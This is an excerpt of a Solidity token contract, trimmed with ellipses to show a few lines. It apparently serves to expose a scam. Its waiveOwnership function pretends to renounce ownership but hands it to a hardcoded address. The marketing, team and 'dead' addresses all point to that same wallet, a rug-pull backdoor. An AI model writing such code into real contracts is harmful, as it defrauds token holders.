...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x0509DdE97Ea7E6A1F2E8db66d473d74ECA93ddF0));
        _owner = address(0x0509DdE97Ea7E6A1F2E8db66d473d74ECA93ddF0);
    }
...
contract ccc is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0x0509DdE97Ea7E6A1F2E8db66d473d74ECA93ddF0);
    address payable public teamWalletAddress = payable(0x0509DdE97Ea7E6A1F2E8db66d473d74ECA93ddF0);
    address public immutable deadAddress =0x0509DdE97Ea7E6A1F2E8db66d473d74ECA93ddF0;
